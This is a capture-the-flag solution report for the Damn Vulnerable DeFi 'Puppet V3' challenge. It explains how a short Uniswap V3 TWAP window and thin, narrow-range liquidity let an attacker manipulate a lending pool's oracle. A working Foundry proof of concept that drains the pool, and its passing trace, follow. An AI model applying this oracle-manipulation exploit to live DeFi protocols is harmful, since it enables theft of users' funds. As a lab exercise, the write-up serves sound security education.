# Damn Vulnerable DeFi - Puppet V3 - Solution Report

## Problem Overview

### Contract Summary

The Puppet V3 challenge revolves around a lending pool contract (`PuppetV3Pool`) that uses Uniswap V3 as a price oracle. The main contracts involved are:

1. `PuppetV3Pool`: The vulnerable lending pool contract. Key functions include:

   - `borrow(uint256 borrowAmount)`: Allows users to borrow tokens by depositing WETH.
   - `calculateDepositOfWETHRequired(uint256 amount)`: Calculates the required WETH deposit for a given token amount.
   - `_getOracleQuote(uint128 amount)`: Internal function that gets the TWAP from Uniswap V3.

2. `DamnValuableToken`: The ERC20 token being borrowed.

3. Uniswap V3 contracts: Used for price discovery and as an oracle.

### Initial Setup

- Uniswap V3 pool: 100 WETH and 100 DVT
- Lending pool: 1,000,000 DVT
- Player: 1 ETH and 110 DVT
- Uniswap V3 pool settings:
  - Fee: 0.3%
  - Tick range: -60 to 60 (narrow liquidity range)
  - Observation cardinality: 40
- TWAP period: 10 minutes

### Success Criteria

- Drain all DVT tokens (1,000,000) from the lending pool
- Transfer the drained tokens to a designated recovery account
- Complete the attack within 115 seconds of simulated time

## Vulnerability

The main vulnerability in this challenge lies in the price oracle mechanism used by the `PuppetV3Pool` contract. Specifically, the vulnerability stems from:

1. Reliance on a short-term TWAP:
   In the `PuppetV3Pool` contract, the TWAP period is set to a very short duration:

   ```solidity
   uint32 public constant TWAP_PERIOD = 10 minutes;
   ```

   This short period makes the oracle susceptible to short-term price manipulations.

2. Low liquidity in the Uniswap V3 pool:
   The Uniswap V3 pool is initialized with only 100 WETH and 100 DVT, which is very low compared to the 1,000,000 DVT in the lending pool. This low liquidity makes it easier to manipulate the pool's price.

3. Narrow liquidity range in Uniswap V3:
   The liquidity in the Uniswap V3 pool is concentrated in a very narrow range:

   ```solidity
   tickLower: -60,
   tickUpper: 60,
   ```

   This narrow range (approximately ±0.6% around the current price) means that even relatively small trades can have a significant impact on the price.

4. Lack of additional price checks or circuit breakers:
   The `PuppetV3Pool` contract doesn't implement any additional checks to detect or prevent drastic price changes. It relies solely on the Uniswap V3 TWAP, which can be manipulated given the above conditions.

These vulnerabilities combined allow an attacker to manipulate the price oracle by making a large trade in the Uniswap V3 pool, wait for the TWAP to reflect this manipulated price, and then use this artificially low price to borrow a large amount of DVT from the lending pool with a relatively small amount of WETH.

## Attack Process

The attack to exploit the vulnerability in the Puppet V3 challenge involves the following steps:

1. Price Manipulation:

   - Approve the Uniswap V3 router to spend the player's DVT tokens.
   - Use the Uniswap V3 SwapRouter to swap all of the player's DVT (110 tokens) for WETH.
   - This large swap in a low-liquidity pool significantly decreases the price of DVT relative to WETH in the Uniswap V3 pool.

2. TWAP Adjustment:

   - Wait for a period of time (close to but not exceeding 115 seconds) to allow the Time-Weighted Average Price (TWAP) to reflect the manipulated price.
   - This step is crucial as it allows the manipulated price to be fully captured by the oracle used by the lending pool.

3. Preparation for Borrowing:

   - Wrap the player's 1 ETH to WETH, increasing the available WETH for the next steps.
   - Approve the lending pool to spend the player's WETH.

4. Calculating Borrow Amount:

   - Query the lending pool for its current DVT balance.
   - Calculate the amount of WETH required to borrow all DVT from the lending pool.
   - This calculation will use the manipulated TWAP, resulting in a very low WETH requirement.

5. Borrowing from Lending Pool:

   - Call the `borrow` function of the lending pool, attempting to borrow all available DVT.
   - Due to the manipulated price, a small amount of WETH will be sufficient to borrow a large amount of DVT.

6. Token Transfer:
   - Transfer all borrowed DVT tokens to the designated recovery address.

## Proof of Concept (PoC)

### Core Implementation

The core implementation of the attack is contained within the `test_puppetV3` function:

```solidity
function test_puppetV3() public checkSolvedByPlayer {
    // Declare Uniswap V3 pool
    IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));

    // Step 1: Approve tokens for trading
    token.approve(address(positionManager), type(uint256).max);
    token.approve(address(uniswapPool), type(uint256).max);

    // Step 2: Swap DVT for WETH to manipulate the price
    ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    token.approve(address(swapRouter), type(uint256).max);

    swapRouter.exactInputSingle(
        ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: FEE,
            recipient: player,
            deadline: block.timestamp,
            amountIn: 110e18,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        })
    );

    // Step 3: Wait for TWAP to adjust (but not more than 114 block timestamp)
    vm.warp(block.timestamp + 114);

    // Step 4: Wrap ETH to WETH
    weth.deposit{value: 1 ether}();

    // Step 5: Approve WETH spending for the lending pool
    weth.approve(address(lendingPool), type(uint256).max);

    // Step 6: Calculate the amount of DVT we can borrow
    uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
    uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(lendingPoolBalance);

    // Check if we have enough WETH to make the deposit
    require(weth.balanceOf(player) >= depositRequired, "Not enough WETH for deposit");

    // Step 7: Borrow all DVT from the lending pool
    lendingPool.borrow(lendingPoolBalance);

    // Step 8: Transfer borrowed DVT to the recovery address
    token.transfer(recovery, lendingPoolBalance);
}
```

### Running Result

```
Ran 1 test for test/puppet-v3/PuppetV3.t.sol:PuppetV3Challenge
[PASS] test_puppetV3() (gas: 827670)
Traces:
  [837270] PuppetV3Challenge::test_puppetV3()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [2666] 0x1F98431c8aD98523631AE4a59f267346ea31F984::getPool(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 3000) [staticcall]
    │   └─ ← [Return] 0xc92836c81fBCe900D13Db1FDe3e4c0726d30AD6C

...
...

    ├─ [0] VM::assertLt(114, 115, "Too much time passed") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(PuppetV3Pool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Lending pool still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
